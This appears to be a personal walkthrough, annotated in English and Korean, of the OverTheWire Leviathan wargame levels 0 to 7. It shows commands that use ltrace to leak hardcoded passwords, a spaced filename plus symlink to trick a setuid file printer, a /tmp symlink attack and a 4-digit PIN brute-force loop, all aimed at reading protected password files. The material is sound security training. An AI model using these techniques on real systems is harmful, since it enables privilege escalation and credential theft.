## leviathan Level 0 -> 1
Command:
```bash
$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223
$ ls
#(no output)
$ ls -al #all, long format
total 24
drwxr-xr-x   3 root       root       4096 Oct 14 09:27 .
drwxr-xr-x 150 root       root       4096 Oct 14 09:29 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Oct 14 09:27 .backup
-rw-r--r--   1 root       root        220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root       3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root       root        807 Mar 31  2024 .profile
$ cd .backup
$ ls
bookmarks.html
$ cat bookmarks.html
Crazy number of website address #Holllllllllllllllllly
$ cat bookmarks.html | grep 'leviathan'
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is ********* ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
#EUREKA
```

Notes:

- ⚠️ 기본 ls는 숨김 파일을 표시하지 않음, ls -al을 통해 숨김 파일이나 디렉토리 확인 가능


_Date 2025-12-18_

## leviathan Level 1 -> 2
Command:
```bash
$ ls
check
$ ./check
password : a
Wrong password, Good Bye ...
$ ltrace ./check #I used a spy tool
__libc_start_main(0x80490ed, 1, 0xffffd474, 0 <unfinished ...>
printf("password: ")                                                 = 10
getchar(0, 0, 0x786573, 0x646f67password: a
getchar(0, 97, 0x786573, 0x646f67)                                   = 10
getchar(0, 2657, 0x786573, 0x646f67
)                                 = 10
strcmp("a\n\n", "sex")                                               = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                 = 29
+++ exited (status 0) +++
# My input ('a') is compared with "sex", so "sex" is the correct answer!
$ ./check
password : sex
$ # Authentication succeeded
$ cat /etc/leviathan_pass/leviathan2
password #XD
```

Notes:
 -⚠️ ltrace : 프로그램이 실행되면서 “라이브러리 함수”를 어떻게 부르는지 실시간으로 보여주는 도구.
strace = 시스템 콜 감시 (커널이랑 대화하는 걸 엿봄)

ltrace = 라이브러리 함수 감시 (glibc 같은 애들이랑 대화하는 걸 엿봄)

용도
✔️ 비밀번호 비교 문자열 찾기

✔️ 숨겨진 출력 확인

✔️ 입력 처리 구조 분석

✔️ CTF / Hack game / reverse engineering

✔️ 디버깅용 분석

자주 쓰는 옵션

-s : 출력 문자열 최대 길이 지정 ex) ltrace -s 9999 ./check

-f : 자식 프로세스까지 추적 ex) ltrace -f ./check

-o : 결과 파일로 저장 ex) ltrace -o result.txt ./check

-e : 특정 함수만 추척 ex) ltrace -e strcmp ./check (비번 비교만 보기)

-l : 특정 라이브러리 호출만

## leviathan level 2 -> 3
Command:
```bash
$ ls
printfile
$ ./printfile
*** File Printer ***
Usage: ./printfile filename
$ ltrace ./printfile
__libc_start_main(0x80490ed, 1, 0xffffd464, 0 <unfinished ...>
puts("*** File Printer ***"*** File Printer ***
)                                         = 21
printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename
)                        = 28
+++ exited (status 255) +++
$ strings printfile
__gmon_start__
*** File Printer ***
Usage: %s filename
You cant have that file...
/bin/cat %s
# 프로그램은 파일 이름(문자열)만 검사하고, system()은 쉘을 호출하면서 공백 기준으로 인자를 분리한다. 즉 파일에 공백 ex)'a b'이 있으면  cat a b 처럼 파일 두 개로 분리됨.
# 그래서 a (일반 파일), b (비번 추적하는 심볼릭 링크) 만들고, ./printfile 'a b' 실행하면 필터 통과 후 /bin/cat a b로 변환.
# 즉 a랑 b 파일 둘 다 출력! 끝!
$ cd /tmp/hope
$ touch a #일반파일
$ ln -s /etc/leviathan_pass/leviathan3 b #심볼릭 링크
$ touch 'a b' #필터 속이기 위한 위장 파일
$ ./printfile 'a b'
password #GG
```

## leviathan level 3 -> 4
Command:
```bash
$ ls
level3
$ ./level3
Enter the password>a
bzzzzzzzzap. WRONG
$ ltrace ./level3
__libc_start_main(0x80490ed, 1, 0xffffd474, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                           = -1
printf("Enter the password> ")                                       = 20
fgets(Enter the password> a
"a\n", 256, 0xf7fae5c0)                                        = 0xffffd24c
strcmp("a\n", "snlprintf\n")                                         = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                           = 19
+++ exited (status 0) +++
#h0no33랑 kakaka는 내부 입력 전에 이미 실행되므로 상관없음 내가 한 입력 a\n이랑 비교되는 snlprintf가 비밀번호!
$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
password #EASY!
```

## leviathan level 4 -> 5
Command:
```bash
$ ls
#Nothing happened
$ ls -al
total 24
drwxr-xr-x   3 root root       4096 Oct 14 09:27 .
drwxr-xr-x 150 root root       4096 Oct 14 09:29 ..
-rw-r--r--   1 root root        220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root       3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root root        807 Mar 31  2024 .profile
dr-xr-x---   2 root leviathan4 4096 Oct 14 09:27 .trash
$ cd .trash
$ ls
bin
$ ./bin
00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010 
#이진수인가?
#공백제거하고 xxd나 perl쓰면 될듯
$ echo '00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010' | tr -d  ' ' | perl -lpe '$_=pack("B*",$_)'
password #xxd는 왜 안됐지? 버전이 안맞나?
```

## leviathan level 5 -> 6
Command:
```bash
$ ls
leviathan5
$ ./leviathan5
Cannot find /tmp/file.log
$ ltrace ./leviathan5
__libc_start_main(0x804910d, 1, 0xffffd464, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                       = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                 = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
# 이것도 tmp에 file.log에 심볼릭 걸고 비번 추적하면 되겠군
$ cd /tmp
$ ln -s /etc/leviathan_pass/leviathan6 file.log
$ ~/leviathan5
password # 굳
```

Notes:
 - ⚠️ /tmp 같은 world-writable 디렉토리를 쓰면 취약점이 많겠군

## leviathan level 6 -> 7
Command:
```bash
$ ls
leviathan6
$ ./leviathan6
usage: ./leviathan6 <4 digit code>
$ ./leviathan6 1234
Wrong
# 0000부터 9999까지 반복하는 명령을 넣으면 되겠군
$ for i in $(seq -w 0000 9999); do ./leviathan6 $i; done
Wrong
Wrong
.
.
.
$ # Authentication succeeded
$ cat /etc/leviathan_pass/leviathan7
password # 굳 그런데 다음엔 Wrong도배 없이 깔끔하게 쉘만 얻게 해봐야겠다!
```

## leviathan level 7
$ ls
CONGRATULATIONS
#GG
